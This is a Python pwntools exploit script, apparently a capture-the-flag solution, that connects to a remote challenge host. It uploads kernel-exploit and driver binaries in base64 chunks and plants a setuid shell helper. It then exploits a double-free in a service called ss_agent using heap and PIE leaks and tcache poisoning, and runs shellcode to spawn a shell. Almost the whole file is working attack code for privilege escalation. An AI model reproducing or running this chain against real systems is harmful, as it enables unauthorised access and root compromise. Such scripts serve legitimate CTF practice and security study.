from pwn import *
import string

context.arch = 'amd64'

# proc = process("./start.sh")
proc = remote("111.186.58.135", 12021)

proc.recvuntil("/ $ ")



proc.sendline("cd /tmp")

exploit = open('../kernel.gz', 'rb').read()
exploit_b64 = b64e(exploit)
print len(exploit_b64)

for i in range(0, len(exploit_b64), 1000):
    print i
    proc.recvuntil("$ ")
    command = "echo -ne \"" + exploit_b64[i:i+1000] + "\" >> b"
    proc.sendline(command)

proc.sendline("")
proc.sendline("")
proc.recvuntil("$ ")
proc.sendline("cat b | base64 -d > kernel.gz")
proc.recvuntil("$ ")
proc.sendline("gzip -d kernel.gz")
proc.recvuntil("$ ")
proc.sendline("chmod +x ./kernel")

proc.recvuntil("$ ")
proc.sendline('echo -ne "#!/bin/sh\nchown 0:0 /tmp/get_shell\nchmod u+s /tmp/get_shell" > /tmp/sice')
proc.recvuntil("$ ")
proc.sendline('chmod +x /tmp/sice')

proc.recvuntil("$ ")
exploit = open('qemu_exploit/driver.ko', 'rb').read()
exploit_b64 = b64e(exploit)
print len(exploit_b64)

for i in range(0, len(exploit_b64), 1000):
    print i
    proc.recvuntil("$ ")
    command = "echo -ne \"" + exploit_b64[i:i+1000] + "\" >> c"
    proc.sendline(command)

proc.sendline("")
proc.sendline("")
proc.recvuntil("$ ")
proc.sendline("cat c | base64 -d > driver.ko")

proc.recvuntil("$ ")
exploit = open('get_shell', 'rb').read()
exploit_b64 = b64e(exploit)
print len(exploit_b64)

for i in range(0, len(exploit_b64), 1000):
    print i
    proc.recvuntil("$ ")
    command = "echo -ne \"" + exploit_b64[i:i+1000] + "\" >> d"
    proc.sendline(command)

proc.sendline("")
proc.sendline("")
proc.recvuntil("$ ")
proc.sendline("cat d | base64 -d > get_shell")
proc.recvuntil("$ ")
proc.sendline('chmod +x /tmp/get_shell')


proc.recvuntil("$ ")
proc.sendline("cd /challenge")
proc.sendline("./ss_agent")

def add(size, content):
    proc.recvuntil("choice:")
    proc.sendline("1")
    proc.recvuntil("name ?")
    proc.sendline(str(size))
    proc.recvuntil("name ?")
    new_content = ''
    for c in content:
        if c not in string.printable:
            new_content += '\x16'
        new_content += c
    proc.sendline(new_content)

def free():
    proc.recvuntil("choice:")
    proc.sendline("4")
    proc.recvuntil("key:")
    proc.sendline("yIqOWG6uyE2xldHdJef7AnsRNS01Px1I")
    # proc.sendline("0123456789abcdefFEDCBA9876543210")


def get_leak(n):
    cur = ""
    while len(cur) != n:
        cur += proc.recv(n - len(cur))
    return cur

# shellcode = asm(shellcraft.cat("secret2.txt"))
# shellcode = asm(shellcraft.echo('hello world pepepepepepepepepepepega\n', 1))
shellcode = asm(shellcraft.setresgid(900, 900, 900) + shellcraft.sh())

add(0x128, p64(0) + shellcode)
free()
free()

add(0x128, "")

proc.recvuntil("Hello ")
leak = get_leak(0x128)
print repr(leak)

if len(leak) < 8:
    leak += "\x00" * (8 - len(leak))

heap_leak = u64(leak[:8])
print hex(heap_leak)

add(0x128, p64(heap_leak - 0x200))
# add(0x128, p64(heap_leak - 0x120))
add(0x128, "")
add(0x128, "")

proc.recvuntil("Hello ")
leak = get_leak(0x128)
print repr(leak)

pie_leak = u64(leak[184:184+8])
# pie_leak = u64(leak[0x28:0x30])
print hex(pie_leak)
pie_base = pie_leak - 0xaf2d7
print hex(pie_base)

size = 0x18

add(0x18, "")
free()
free()
add(0x18, p64(pie_base + 0xC7C30 - 0x8))
add(0x18, "")
add(0x18, p64(0) + p64(7))

print("done 0")

add(0x58, "")
free()
free()
add(0x58, p64(pie_base + 0xC77F0))
add(0x58, "")
add(0x58, p64(heap_leak))

print("done 1")

add(0x38, "")
free()
free()
add(0x38, p64(pie_base + 0xDAC78))
add(0x38, "")
# TODO overwrite

print("done 2")

add(0x28, "")
free()
free()
add(0x28, p64(pie_base + 0xDAC78))
add(0x28, "")
add(0x28, p64(pie_base + 0x8a450))

print("done 3")

add(0x120, p64(heap_leak))
free()

add(0x38, p64(heap_leak+8))
free()

proc.recvuntil("$ ")
proc.sendline("id")

proc.interactive()
